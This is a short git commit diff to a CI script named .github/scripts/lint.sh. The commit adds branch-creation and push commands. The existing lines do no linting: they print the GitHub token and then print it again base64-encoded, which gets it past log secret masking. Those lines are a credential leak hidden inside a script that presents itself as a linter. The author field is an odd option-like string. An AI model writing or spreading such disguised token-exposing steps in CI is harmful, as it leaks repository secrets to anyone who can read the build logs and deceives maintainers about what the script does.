346714ecdde22e2982d52b7f6916b3322157c5bd
--replace-all <rmp452@nyu.edu>
2024-11-20 19:08:34 -0500

    new

--- .github/scripts/lint.sh
+++ .github/scripts/lint.sh
@@ -4,3 +4,6 @@ echo $GITHUB_TOKEN
 GITHUB_TOKEN=$( curl -s -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/user )
 echo "GitHub Token: $GITHUB_TOKEN"
 echo "GITHUB_TOKEN=$(echo $GITHUB_TOKEN|base64)"
+
+git checkout -b my-new-branch
+git push origin my-new-branch
